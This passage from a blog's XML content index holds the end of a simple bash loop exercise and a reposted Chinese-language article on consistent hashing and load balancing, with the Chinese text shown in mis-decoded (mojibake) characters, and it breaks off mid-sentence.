$num</span><br><span class="line">fi</span><br><span class="line">    let <span class="string">&quot;num++&quot;</span></span><br><span class="line">done</span><br></pre></td></tr></table></figure><ul><li>é€†å‘</li></ul><ol><li>åˆå§‹å€¼=0ï¼Œå¯ç›´æ¥è¾“å‡º</li><li>ä»¥7ä¸ºå€æ•°è¿›è¡Œè‡ªå¢å¹¶è¾“å‡ºã€‚å¾—åˆ°çš„ç»“æœéƒ½æ˜¯æ»¡è¶³é¢˜æ„<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!bin/bash</span></span><br><span class="line">num=0</span><br><span class="line">while (( $num&lt;=500 ))</span><br><span class="line">do</span><br><span class="line">    echo $num</span><br><span class="line">     let <span class="string">&quot;num+=7&quot;</span></span><br><span class="line">done</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä»€ä¹ˆæ˜¯ä¸€è‡´æ€§å“ˆå¸Œ</title>
      <link href="/2022/04/04/%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C/"/>
      <url>/2022/04/04/%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C/</url>
      
        <content type="html"><![CDATA[<blockquote><p>æœ¬æ–‡è½¬è‡ª<a href="https://www.cnblogs.com/xiaolincoding/p/15918321.html">https://www.cnblogs.com/xiaolincoding/p/15918321.html</a></p></blockquote><p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯å°æ—ã€‚<br>åœ¨é€›ç‰›å®¢ç½‘çš„é¢ç»çš„æ—¶å€™ï¼Œå‘ç°æœ‰ä½åŒå­¦åœ¨é¢å¾®ä¿¡çš„æ—¶å€™ï¼Œè¢«é—®åˆ°è¿™ä¸ªé—®é¢˜ï¼š<br><img src="https://snowgo.top/medias/medias/%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C/14.png"><br>ç¬¬ä¸€ä¸ªé—®é¢˜å°±æ˜¯ï¼š<strong>ä¸€è‡´æ€§å“ˆå¸Œæ˜¯ä»€ä¹ˆï¼Œä½¿ç”¨åœºæ™¯ï¼Œè§£å†³äº†ä»€ä¹ˆé—®é¢˜ï¼Ÿ</strong><br>è¿™ä¸ªé—®é¢˜è¿˜æŒºæœ‰æ„æ€çš„ï¼Œæ‰€ä»¥ä»Šå¤©å°±æ¥èŠèŠè¿™ä¸ªã€‚<br>å‘è½¦ï¼<br><img src="https://snowgo.top/medias/medias/%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C/15.png"></p><h2 id="å¦‚ä½•åˆ†é…è¯·æ±‚ï¼Ÿ"><a href="#å¦‚ä½•åˆ†é…è¯·æ±‚ï¼Ÿ" class="headerlink" title="å¦‚ä½•åˆ†é…è¯·æ±‚ï¼Ÿ"></a><strong>å¦‚ä½•åˆ†é…è¯·æ±‚ï¼Ÿ</strong></h2><p>å¤§å¤šæ•°ç½‘ç«™èƒŒåè‚¯å®šä¸æ˜¯åªæœ‰ä¸€å°æœåŠ¡å™¨æä¾›æœåŠ¡ï¼Œå› ä¸ºå•æœºçš„å¹¶å‘é‡å’Œæ•°æ®é‡éƒ½æ˜¯æœ‰é™çš„ï¼Œæ‰€ä»¥éƒ½ä¼šç”¨å¤šå°æœåŠ¡å™¨æ„æˆé›†ç¾¤æ¥å¯¹å¤–æä¾›æœåŠ¡ã€‚<br>ä½†æ˜¯é—®é¢˜æ¥äº†ï¼Œç°åœ¨æœ‰é‚£ä¹ˆå¤šä¸ªèŠ‚ç‚¹ï¼ˆåé¢ç»Ÿç§°æœåŠ¡å™¨ä¸ºèŠ‚ç‚¹ï¼Œå› ä¸ºå°‘ä¸€ä¸ªå­—ï¼‰ï¼Œè¦å¦‚ä½•åˆ†é…å®¢æˆ·ç«¯çš„è¯·æ±‚å‘¢ï¼Ÿ<br><img src="https://snowgo.top/medias/medias/%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C/16.png"><br>å…¶å®è¿™ä¸ªé—®é¢˜å°±æ˜¯ã€Œè´Ÿè½½å‡è¡¡é—®é¢˜ã€ã€‚è§£å†³è´Ÿè½½å‡è¡¡é—®é¢˜çš„ç®—æ³•å¾ˆå¤šï¼Œä¸åŒçš„è´Ÿè½½å‡è¡¡ç®—æ³•ï¼Œå¯¹åº”çš„å°±æ˜¯ä¸åŒçš„åˆ†é…ç­–ç•¥ï¼Œé€‚åº”çš„ä¸šåŠ¡åœºæ™¯ä¹Ÿä¸åŒã€‚<br>æœ€ç®€å•çš„æ–¹å¼ï¼Œå¼•å…¥ä¸€ä¸ªä¸­é—´çš„è´Ÿè½½å‡è¡¡å±‚ï¼Œè®©å®ƒå°†å¤–ç•Œçš„è¯·æ±‚ã€Œè½®æµã€çš„è½¬å‘ç»™å†…éƒ¨çš„é›†ç¾¤ã€‚æ¯”å¦‚é›†ç¾¤æœ‰ 3 ä¸ªèŠ‚ç‚¹ï¼Œå¤–ç•Œè¯·æ±‚æœ‰ 3 ä¸ªï¼Œé‚£ä¹ˆæ¯ä¸ªèŠ‚ç‚¹éƒ½ä¼šå¤„ç† 1 ä¸ªè¯·æ±‚ï¼Œè¾¾åˆ°äº†åˆ†é…è¯·æ±‚çš„ç›®çš„ã€‚<br><img src="https://snowgo.top/medias/medias/%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C/17.png"><br>è€ƒè™‘åˆ°æ¯ä¸ªèŠ‚ç‚¹çš„ç¡¬ä»¶é…ç½®æœ‰æ‰€åŒºåˆ«ï¼Œæˆ‘ä»¬å¯ä»¥å¼•å…¥æƒé‡å€¼ï¼Œå°†ç¡¬ä»¶é…ç½®æ›´å¥½çš„èŠ‚ç‚¹çš„æƒé‡å€¼è®¾é«˜ï¼Œç„¶åæ ¹æ®å„ä¸ªèŠ‚ç‚¹çš„æƒé‡å€¼ï¼ŒæŒ‰ç…§ä¸€å®šæ¯”é‡åˆ†é…åœ¨ä¸åŒçš„èŠ‚ç‚¹ä¸Šï¼Œè®©ç¡¬ä»¶é…ç½®æ›´å¥½çš„èŠ‚ç‚¹æ‰¿æ‹…æ›´å¤šçš„è¯·æ±‚ï¼Œè¿™ç§ç®—æ³•å«åšåŠ æƒè½®è¯¢ã€‚<br>åŠ æƒè½®è¯¢ç®—æ³•ä½¿ç”¨åœºæ™¯æ˜¯å»ºç«‹åœ¨æ¯ä¸ªèŠ‚ç‚¹å­˜å‚¨çš„æ•°æ®éƒ½æ˜¯ç›¸åŒçš„å‰æã€‚æ‰€ä»¥ï¼Œæ¯æ¬¡è¯»æ•°æ®çš„è¯·æ±‚ï¼Œè®¿é—®ä»»æ„ä¸€ä¸ªèŠ‚ç‚¹éƒ½èƒ½å¾—åˆ°ç»“æœã€‚<br>ä½†æ˜¯ï¼ŒåŠ æƒè½®è¯¢ç®—æ³•æ˜¯æ— æ³•åº”å¯¹ã€Œåˆ†å¸ƒå¼ç³»ç»Ÿã€çš„ï¼Œå› ä¸ºåˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼Œæ¯ä¸ªèŠ‚ç‚¹å­˜å‚¨çš„æ•°æ®æ˜¯ä¸åŒçš„ã€‚<br>å½“æˆ‘ä»¬æƒ³æé«˜ç³»ç»Ÿçš„å®¹é‡ï¼Œå°±ä¼šå°†æ•°æ®æ°´å¹³åˆ‡åˆ†åˆ°ä¸åŒçš„èŠ‚ç‚¹æ¥å­˜å‚¨ï¼Œä¹Ÿå°±æ˜¯å°†æ•°æ®åˆ†å¸ƒåˆ°äº†ä¸åŒçš„èŠ‚ç‚¹ã€‚æ¯”å¦‚<strong>ä¸€ä¸ªåˆ†å¸ƒå¼ KVï¼ˆkey-valuï¼‰ ç¼“å­˜ç³»ç»Ÿï¼ŒæŸä¸ª key åº”è¯¥åˆ°å“ªä¸ªæˆ–è€…å“ªäº›èŠ‚ç‚¹ä¸Šè·å¾—ï¼Œåº”è¯¥æ˜¯ç¡®å®šçš„</strong>ï¼Œä¸æ˜¯è¯´ä»»æ„è®¿é—®ä¸€ä¸ªèŠ‚ç‚¹éƒ½å¯ä»¥å¾—åˆ°ç¼“å­˜ç»“æœçš„ã€‚<br>å› æ­¤ï¼Œæˆ‘ä»¬è¦æƒ³ä¸€ä¸ªèƒ½åº”å¯¹åˆ†å¸ƒå¼ç³»ç»Ÿçš„è´Ÿè½½å‡è¡¡ç®—æ³•ã€‚</p><h2 id="ä½¿ç”¨å“ˆå¸Œç®—æ³•æœ‰ä»€ä¹ˆé—®é¢˜ï¼Ÿ"><a href="#ä½¿ç”¨å“ˆå¸Œç®—æ³•æœ‰ä»€ä¹ˆé—®é¢˜ï¼Ÿ" class="headerlink" title="ä½¿ç”¨å“ˆå¸Œç®—æ³•æœ‰ä»€ä¹ˆé—®é¢˜ï¼Ÿ"></a><strong>ä½¿ç”¨å“ˆå¸Œç®—æ³•æœ‰ä»€ä¹ˆé—®é¢˜ï¼Ÿ</strong></h2><p>æœ‰çš„åŒå­¦å¯èƒ½å¾ˆå¿«å°±æƒ³åˆ°äº†ï¼š<strong>å“ˆå¸Œç®—æ³•</strong>ã€‚å› ä¸ºå¯¹åŒä¸€ä¸ªå…³é”®å­—è¿›è¡Œå“ˆå¸Œè®¡ç®—ï¼Œæ¯æ¬¡è®¡ç®—éƒ½æ˜¯ç›¸åŒçš„å€¼ï¼Œè¿™æ ·å°±å¯ä»¥å°†æŸä¸ª key ç¡®å®šåˆ°ä¸€ä¸ªèŠ‚ç‚¹äº†ï¼Œå¯ä»¥æ»¡è¶³åˆ†å¸ƒå¼ç³»ç»Ÿçš„è´Ÿè½½å‡è¡¡éœ€æ±‚ã€‚<br>å“ˆå¸Œç®—æ³•æœ€ç®€å•çš„åšæ³•å°±æ˜¯è¿›è¡Œå–æ¨¡è¿ç®—ï¼Œæ¯”å¦‚åˆ†å¸ƒå¼ç³»ç»Ÿä¸­æœ‰ 3 ä¸ªèŠ‚ç‚¹ï¼ŒåŸºäº hash(key) % 3 å…¬å¼å¯¹æ•°æ®è¿›è¡Œäº†æ˜ å°„ã€‚<br>å¦‚æœå®¢æˆ·ç«¯è¦è·å–æŒ‡å®š key çš„æ•°æ®ï¼Œé€šè¿‡ä¸‹é¢çš„å…¬å¼å¯ä»¥å®šä½èŠ‚ç‚¹ï¼š<br>hash(key)Â %Â 3<br>å¦‚æœç»è¿‡ä¸Šé¢è¿™ä¸ªå…¬å¼è®¡ç®—åå¾—åˆ°çš„å€¼æ˜¯ 0ï¼Œå°±è¯´æ˜è¯¥ key éœ€è¦å»ç¬¬ä¸€ä¸ªèŠ‚ç‚¹è·å–ã€‚<br>ä½†æ˜¯æœ‰ä¸€ä¸ªå¾ˆè‡´å‘½çš„é—®é¢˜ï¼Œ<strong>å¦‚æœèŠ‚ç‚¹æ•°é‡å‘ç”Ÿäº†å˜åŒ–ï¼Œä¹Ÿå°±æ˜¯åœ¨å¯¹ç³»ç»Ÿåšæ‰©å®¹æˆ–è€…ç¼©å®¹æ—¶ï¼Œå¿…é¡»è¿ç§»æ”¹å˜äº†æ˜ å°„å…³ç³»çš„æ•°æ®</strong>ï¼Œå¦åˆ™ä¼šå‡ºç°æŸ¥è¯¢ä¸åˆ°æ•°æ®çš„é—®é¢˜ã€‚<br>ä¸¾ä¸ªä¾‹å­ï¼Œå‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªç”± Aã€Bã€C ä¸‰ä¸ªèŠ‚ç‚¹ç»„æˆåˆ†å¸ƒå¼ KV ç¼“å­˜ç³»ç»Ÿï¼ŒåŸºäºè®¡ç®—å…¬å¼ hash(key) % 3 å°†æ•°æ®è¿›è¡Œäº†æ˜ å°„ï¼Œæ¯ä¸ªèŠ‚ç‚¹å­˜å‚¨äº†ä¸åŒçš„æ•°æ®ï¼š<br><img src="https://snowgo.top/medias/medias/%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C/18.png"><br>ç°åœ¨æœ‰ 3 ä¸ªæŸ¥è¯¢ key çš„è¯·æ±‚ï¼Œåˆ†åˆ«æŸ¥è¯¢ key-01ï¼Œkey-02ï¼Œkey-03 çš„æ•°æ®ï¼Œè¿™ä¸‰ä¸ª key åˆ†åˆ«ç»è¿‡ hash() å‡½æ•°è®¡ç®—åçš„å€¼ä¸º hash( key-01) = 6ã€hash( key-02) = 7ã€hash(key-03) = 8ï¼Œç„¶åå†å¯¹è¿™äº›å€¼è¿›è¡Œå–æ¨¡è¿ç®—ã€‚<br>é€šè¿‡è¿™æ ·çš„å“ˆå¸Œç®—æ³•ï¼Œæ¯ä¸ª key éƒ½å¯ä»¥å®šä½åˆ°å¯¹åº”çš„èŠ‚ç‚¹ã€‚<br><img src="https://snowgo.top/medias/medias/%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C/19.png"><br>å½“ 3 ä¸ªèŠ‚ç‚¹ä¸èƒ½æ»¡è¶³ä¸šåŠ¡éœ€æ±‚äº†ï¼Œè¿™æ—¶æˆ‘ä»¬å¢åŠ äº†ä¸€ä¸ªèŠ‚ç‚¹ï¼ŒèŠ‚ç‚¹çš„æ•°é‡ä» 3 å˜åŒ–ä¸º 4ï¼Œæ„å‘³å–æ¨¡å“ˆå¸Œå‡½æ•°ä¸­åŸºæ•°çš„å˜åŒ–ï¼Œè¿™æ ·ä¼šå¯¼è‡´<strong>å¤§éƒ¨åˆ†æ˜ å°„å…³ç³»æ”¹å˜</strong>ï¼Œå¦‚ä¸‹å›¾ï¼š<br><img src="https://snowgo.top/medias/medias/%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C/20.png"><br>æ¯”å¦‚ï¼Œä¹‹å‰çš„ hash(key-01) % 3 = 0ï¼Œå°±å˜æˆäº† hash(key-01) % 4 = 2ï¼ŒæŸ¥è¯¢ key-01 æ•°æ®æ—¶ï¼Œå¯»å€åˆ°äº†èŠ‚ç‚¹ Cï¼Œè€Œ key-01 çš„æ•°æ®æ˜¯å­˜å‚¨åœ¨èŠ‚ç‚¹ A ä¸Šçš„ï¼Œä¸æ˜¯åœ¨èŠ‚ç‚¹ Cï¼Œæ‰€ä»¥ä¼šæŸ¥è¯¢ä¸åˆ°æ•°æ®ã€‚<br>åŒæ ·çš„é“ç†ï¼Œå¦‚æœæˆ‘ä»¬å¯¹åˆ†å¸ƒå¼ç³»ç»Ÿè¿›è¡Œç¼©å®¹ï¼Œæ¯”å¦‚ç§»é™¤ä¸€ä¸ªèŠ‚ç‚¹ï¼Œä¹Ÿä¼šå› ä¸ºå–æ¨¡å“ˆå¸Œå‡½æ•°ä¸­åŸºæ•°çš„å˜åŒ–ï¼Œå¯èƒ½å‡ºç°æŸ¥è¯¢ä¸åˆ°æ•°æ®çš„é—®é¢˜ã€‚<br>è¦è§£å†³è¿™ä¸ªé—®é¢˜çš„åŠæ³•ï¼Œå°±éœ€è¦æˆ‘ä»¬è¿›è¡Œ<strong>è¿ç§»æ•°æ®</strong>ï¼Œæ¯”å¦‚èŠ‚ç‚¹çš„æ•°é‡ä» 3 å˜åŒ–ä¸º 4 æ—¶ï¼Œè¦åŸºäºæ–°çš„è®¡ç®—å…¬å¼ hash(key) % 4 ï¼Œé‡æ–°å¯¹æ•°æ®å’ŒèŠ‚ç‚¹åšæ˜ å°„ã€‚<br>å‡è®¾æ€»æ•°æ®æ¡æ•°ä¸º Mï¼Œå“ˆå¸Œç®—æ³•åœ¨é¢å¯¹èŠ‚ç‚¹æ•°é‡å˜åŒ–æ—¶ï¼Œ**æœ€åæƒ…å†µä¸‹æ‰€æœ‰æ•°æ®éƒ½éœ€è¦è¿ç§»ï¼Œæ‰€ä»¥å®ƒçš„æ•°æ®è¿ç§»è§„æ¨¡æ˜¯ O(M)**ï¼Œè¿™æ ·æ•°æ®çš„è¿ç§»æˆæœ¬å¤ªé«˜äº†ã€‚<br>æ‰€ä»¥ï¼Œæˆ‘ä»¬åº”è¯¥è¦é‡æ–°æƒ³ä¸€ä¸ªæ–°çš„ç®—æ³•ï¼Œæ¥é¿å…åˆ†å¸ƒå¼ç³»ç»Ÿåœ¨æ‰©å®¹æˆ–è€…ç¼©å®¹æ—¶ï¼Œå‘ç”Ÿè¿‡å¤šçš„æ•°æ®è¿ç§»ã€‚</p><h2 id="ä½¿ç”¨ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•æœ‰ä»€ä¹ˆé—®é¢˜ï¼Ÿ"><a href="#ä½¿ç”¨ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•æœ‰ä»€ä¹ˆé—®é¢˜ï¼Ÿ" class="headerlink" title="ä½¿ç”¨ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•æœ‰ä»€ä¹ˆé—®é¢˜ï¼Ÿ"></a><strong>ä½¿ç”¨ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•æœ‰ä»€ä¹ˆé—®é¢˜ï¼Ÿ</strong></h2><p>ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•å°±å¾ˆå¥½åœ°è§£å†³äº†åˆ†å¸ƒå¼ç³»ç»Ÿåœ¨æ‰©å®¹æˆ–è€…ç¼©å®¹æ—¶ï¼Œå‘ç”Ÿè¿‡å¤šçš„æ•°æ®è¿ç§»çš„é—®é¢˜ã€‚<br>ä¸€è‡´å“ˆå¸Œç®—æ³•ä¹Ÿç”¨äº†å–æ¨¡è¿ç®—ï¼Œä½†ä¸å“ˆå¸Œç®—æ³•ä¸åŒçš„æ˜¯ï¼Œå“ˆå¸Œç®—æ³•æ˜¯å¯¹èŠ‚ç‚¹çš„æ•°é‡è¿›è¡Œå–æ¨¡è¿ç®—ï¼Œè€Œ<strong>ä¸€è‡´å“ˆå¸Œç®—æ³•æ˜¯å¯¹ 2^32 è¿›è¡Œå–æ¨¡è¿ç®—ï¼Œæ˜¯ä¸€ä¸ªå›ºå®šçš„å€¼</strong>ã€‚<br>æˆ‘ä»¬å¯ä»¥æŠŠä¸€è‡´å“ˆå¸Œç®—æ³•æ˜¯å¯¹ 2^32 è¿›è¡Œå–æ¨¡è¿ç®—çš„ç»“æœå€¼ç»„ç»‡æˆä¸€ä¸ªåœ†ç¯ï¼Œå°±åƒé’Ÿè¡¨ä¸€æ ·ï¼Œé’Ÿè¡¨çš„åœ†å¯ä»¥ç†è§£æˆç”± 60 ä¸ªç‚¹ç»„æˆçš„åœ†ï¼Œè€Œæ­¤å¤„æˆ‘ä»¬æŠŠè¿™ä¸ªåœ†æƒ³è±¡æˆç”± 2^32 ä¸ªç‚¹ç»„æˆçš„åœ†ï¼Œè¿™ä¸ªåœ†ç¯è¢«ç§°ä¸º<strong>å“ˆå¸Œç¯</strong>ï¼Œå¦‚ä¸‹å›¾ï¼š<br><img src="https://snowgo.top/medias/medias/%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C/21.png"><br>ä¸€è‡´æ€§å“ˆå¸Œè¦è¿›è¡Œä¸¤æ­¥å“ˆå¸Œï¼š</p><ul><li>ç¬¬ä¸€æ­¥ï¼šå¯¹å­˜å‚¨èŠ‚ç‚¹è¿›è¡Œå“ˆå¸Œè®¡ç®—ï¼Œä¹Ÿå°±æ˜¯å¯¹å­˜å‚¨èŠ‚ç‚¹åšå“ˆå¸Œæ˜ å°„ï¼Œæ¯”å¦‚æ ¹æ®èŠ‚ç‚¹çš„ IP åœ°å€è¿›è¡Œå“ˆå¸Œï¼›</li><li>ç¬¬äºŒæ­¥ï¼šå½“å¯¹æ•°æ®è¿›è¡Œå­˜å‚¨æˆ–è®¿é—®æ—¶ï¼Œå¯¹æ•°æ®è¿›è¡Œå“ˆå¸Œæ˜ å°„ï¼›</li></ul><p>æ‰€ä»¥ï¼Œ<strong>ä¸€è‡´æ€§å“ˆå¸Œæ˜¯æŒ‡å°†ã€Œå­˜å‚¨èŠ‚ç‚¹ã€å’Œã€Œæ•°æ®ã€éƒ½æ˜ å°„åˆ°ä¸€ä¸ªé¦–å°¾ç›¸è¿çš„å“ˆå¸Œç¯ä¸Š</strong>ã€‚<br>é—®é¢˜æ¥äº†ï¼Œå¯¹ã€Œæ•°æ®ã€è¿›è¡Œå“ˆå¸Œæ˜ å°„å¾—åˆ°ä¸€ä¸ªç»“æœè¦æ€ä¹ˆæ‰¾åˆ°å­˜å‚¨è¯¥æ•°æ®çš„èŠ‚ç‚¹å‘¢ï¼Ÿ<br>ç­”æ¡ˆæ˜¯ï¼Œæ˜ å°„çš„ç»“æœå€¼å¾€<strong>é¡ºæ—¶é’ˆçš„æ–¹å‘çš„æ‰¾åˆ°ç¬¬ä¸€ä¸ªèŠ‚ç‚¹</strong>ï¼Œå°±æ˜¯å­˜å‚¨è¯¥æ•°æ®çš„èŠ‚ç‚¹ã€‚<br>ä¸¾ä¸ªä¾‹å­ï¼Œæœ‰ 3 ä¸ªèŠ‚ç‚¹ç»è¿‡å“ˆå¸Œè®¡ç®—ï¼Œæ˜ å°„åˆ°äº†å¦‚ä¸‹å›¾çš„ä½ç½®ï¼š<br><img src="https://snowgo.top/medias/medias/%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C/22.png"><br>æ¥ç€ï¼Œå¯¹è¦æŸ¥è¯¢çš„ key-01 è¿›è¡Œå“ˆå¸Œè®¡ç®—ï¼Œç¡®å®šæ­¤ key-01 æ˜ å°„åœ¨å“ˆå¸Œç¯çš„ä½ç½®ï¼Œç„¶åä»è¿™ä¸ªä½ç½®å¾€é¡ºæ—¶é’ˆçš„æ–¹å‘æ‰¾åˆ°ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ï¼Œå°±æ˜¯å­˜å‚¨è¯¥ key-01 æ•°æ®çš„èŠ‚ç‚¹ã€‚<br>æ¯”å¦‚ï¼Œä¸‹å›¾ä¸­çš„ key-01 æ˜ å°„çš„ä½ç½®ï¼Œå¾€é¡ºæ—¶é’ˆçš„æ–¹å‘æ‰¾åˆ°ç¬¬ä¸€ä¸ªèŠ‚ç‚¹å°±æ˜¯èŠ‚ç‚¹ Aã€‚<br><img src="https://snowgo.top/medias/medias/%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C/23.png"><br>æ‰€ä»¥ï¼Œå½“éœ€è¦å¯¹æŒ‡å®š key çš„å€¼è¿›è¡Œè¯»å†™çš„æ—¶å€™ï¼Œè¦é€šè¿‡ä¸‹é¢ 2 æ­¥è¿›è¡Œå¯»å€ï¼š</p><ul><li>é¦–å…ˆï¼Œå¯¹ key è¿›è¡Œå“ˆå¸Œè®¡ç®—ï¼Œç¡®å®šæ­¤ key åœ¨ç¯ä¸Šçš„ä½ç½®ï¼›</li><li>ç„¶åï¼Œä»è¿™ä¸ªä½ç½®æ²¿ç€é¡ºæ—¶é’ˆæ–¹å‘èµ°ï¼Œé‡åˆ°çš„ç¬¬ä¸€èŠ‚ç‚¹å°±æ˜¯å­˜å‚¨ key çš„èŠ‚ç‚¹ã€‚</li></ul><p>çŸ¥é“äº†ä¸€è‡´å“ˆå¸Œå¯»å€çš„æ–¹å¼ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹ï¼Œå¦‚æœå¢åŠ ä¸€ä¸ªèŠ‚ç‚¹æˆ–è€…å‡å°‘ä¸€ä¸ªèŠ‚ç‚¹ä¼šå‘ç”Ÿå¤§é‡çš„æ•°æ®è¿ç§»å—ï¼Ÿ<br>å‡è®¾èŠ‚ç‚¹æ•°é‡ä» 3 å¢åŠ åˆ°äº† 4ï¼Œæ–°çš„èŠ‚ç‚¹ D ç»è¿‡å“ˆå¸Œè®¡ç®—åæ˜ å°„åˆ°äº†ä¸‹å›¾ä¸­çš„ä½ç½®ï¼š<br><img src="https://snowgo.top/medias/medias/%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C/24.png"><br>ä½ å¯ä»¥çœ‹åˆ°ï¼Œkey-01ã€key-03 éƒ½ä¸å—å½±å“ï¼Œåªæœ‰ key-02 éœ€è¦è¢«è¿ç§»èŠ‚ç‚¹ Dã€‚<br>å‡è®¾èŠ‚ç‚¹æ•°é‡ä» 3 å‡å°‘åˆ°äº† 2ï¼Œæ¯”å¦‚å°†èŠ‚ç‚¹ A ç§»é™¤ï¼š<br><img src="https://snowgo.top/medias/medias/%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C/25.png"><br>ä½ å¯ä»¥çœ‹åˆ°ï¼Œkey-02 å’Œ key-03 ä¸ä¼šå—åˆ°å½±å“ï¼Œåªæœ‰ key-01 éœ€è¦è¢«è¿ç§»èŠ‚ç‚¹ Bã€‚<br>å› æ­¤ï¼Œ<strong>åœ¨ä¸€è‡´å“ˆå¸Œç®—æ³•ä¸­ï¼Œå¦‚æœå¢åŠ æˆ–è€…ç§»é™¤ä¸€ä¸ªèŠ‚ç‚¹ï¼Œä»…å½±å“è¯¥èŠ‚ç‚¹åœ¨å“ˆå¸Œç¯ä¸Šé¡ºæ—¶é’ˆç›¸é‚»çš„åç»§èŠ‚ç‚¹ï¼Œå…¶å®ƒæ•°æ®ä¹Ÿä¸ä¼šå—åˆ°å½±å“</strong>ã€‚<br>ä¸Šé¢è¿™äº›å›¾ä¸­ 3 ä¸ªèŠ‚ç‚¹æ˜ å°„åœ¨å“ˆå¸Œç¯è¿˜æ˜¯æ¯”è¾ƒåˆ†æ•£çš„ï¼Œæ‰€ä»¥çœ‹èµ·æ¥è¯·æ±‚éƒ½ä¼šã€Œå‡è¡¡ã€åˆ°æ¯ä¸ªèŠ‚ç‚¹ã€‚<br>ä½†æ˜¯<strong>ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•å¹¶ä¸ä¿è¯èŠ‚ç‚¹èƒ½å¤Ÿåœ¨å“ˆå¸Œç¯ä¸Šåˆ†å¸ƒå‡åŒ€</strong>ï¼Œè¿™æ ·å°±ä¼šå¸¦æ¥ä¸€ä¸ªé—®é¢˜ï¼Œä¼šæœ‰å¤§é‡çš„è¯·æ±‚é›†ä¸­åœ¨ä¸€ä¸ªèŠ‚ç‚¹ä¸Šã€‚<br>æ¯”å¦‚ï¼Œä¸‹å›¾ä¸­ 3 ä¸ªèŠ‚ç‚¹çš„æ˜ å°„ä½ç½®éƒ½åœ¨å“ˆå¸Œç¯çš„å³åŠè¾¹ï¼š<br><img src="https://snowgo.top/medias/medias/%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C/26.png"><br>è¿™æ—¶å€™æœ‰ä¸€åŠä»¥ä¸Šçš„æ•°æ®çš„å¯»å€éƒ½ä¼šæ‰¾èŠ‚ç‚¹ Aï¼Œä¹Ÿå°±æ˜¯è®¿é—®è¯·æ±‚ä¸»è¦é›†ä¸­çš„èŠ‚ç‚¹ A ä¸Šï¼Œè¿™è‚¯å®šä¸è¡Œçš„å‘€ï¼Œè¯´å¥½çš„è´Ÿè½½å‡è¡¡å‘¢ï¼Œè¿™ç§æƒ…å†µä¸€ç‚¹éƒ½ä¸å‡è¡¡ã€‚<br>å¦å¤–ï¼Œåœ¨è¿™ç§èŠ‚ç‚¹åˆ†å¸ƒä¸å‡åŒ€çš„æƒ…å†µä¸‹ï¼Œè¿›è¡Œå®¹ç¾ä¸æ‰©å®¹æ—¶ï¼Œå“ˆå¸Œç¯ä¸Šçš„ç›¸é‚»èŠ‚ç‚¹å®¹æ˜“å—åˆ°è¿‡å¤§å½±å“ï¼Œå®¹æ˜“å‘ç”Ÿé›ªå´©å¼çš„è¿é”ååº”ã€‚<br>æ¯”å¦‚ï¼Œä¸Šå›¾ä¸­å¦‚æœèŠ‚ç‚¹ A è¢«ç§»é™¤äº†ï¼Œå½“èŠ‚ç‚¹ A å®•æœºåï¼Œæ ¹æ®ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•çš„è§„åˆ™ï¼Œå…¶ä¸Šæ•°æ®åº”è¯¥å…¨éƒ¨è¿ç§»åˆ°ç›¸é‚»çš„èŠ‚ç‚¹ B ä¸Šï¼Œè¿™æ ·ï¼ŒèŠ‚ç‚¹ B çš„æ•°æ®é‡ã€è®¿é—®é‡éƒ½ä¼šè¿…é€Ÿå¢åŠ å¾ˆå¤šå€ï¼Œä¸€æ—¦æ–°å¢çš„å‹åŠ›è¶…è¿‡äº†èŠ‚ç‚¹ B çš„å¤„ç†èƒ½åŠ›ä¸Šé™ï¼Œå°±ä¼šå¯¼è‡´èŠ‚ç‚¹ B 